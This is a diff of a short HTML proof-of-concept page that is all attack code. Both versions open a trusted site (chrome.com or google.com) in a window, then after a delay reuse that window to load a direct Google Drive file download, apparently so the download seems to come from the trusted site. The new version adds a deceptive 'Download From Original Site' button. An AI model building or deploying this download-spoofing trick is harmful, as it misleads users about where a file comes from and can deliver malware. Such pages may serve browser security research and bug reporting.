@@ -1,29 +1,30 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>poc</title>
+ <head> 
+  <meta charset="utf-8">
+<style>
+.button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+</style>
+ </head> 
+ <body> 
   <script>
-    function chainRedirect(w, urls, index = 0) {
-      if (index < urls.length) {
-        w.location.replace(urls[index]);
-        setTimeout(() => chainRedirect(w, urls, index + 1), 1000);
-      }
-    }
-
-    function startRedirect() {
-      let w = window.open("");
-      setTimeout(() => {
-        chainRedirect(w, [
-        "https://chrome.com",
-        "https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=5bdc824e-e9f2-4d16-b944-03088f37c506&at=AGN2oQ1FlDA48w-_QaRH1LvALFFA:1773898570212",
-        "https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=5bdc824e-e9f2-4d16-b944-03088f37c506&at=AGN2oQ1FlDA48w-_QaRH1LvALFFA:1773898570212",
-        ]);
-      }, 1000);
-    }
-  </script>
-</head>
-<body>
-  <button onclick="startRedirect()">Start</button>
-</body>
+function a(){
+    window.open('https://google.com', 'x');
+    setTimeout(function(){
+        window.open('https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=5bdc824e-e9f2-4d16-b944-03088f37c506&at=AGN2oQ1FlDA48w-_QaRH1LvALFFA:1773898570212', 'x');
+    }, 5000);
+}
+</script> 
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
+ </body>
 </html>
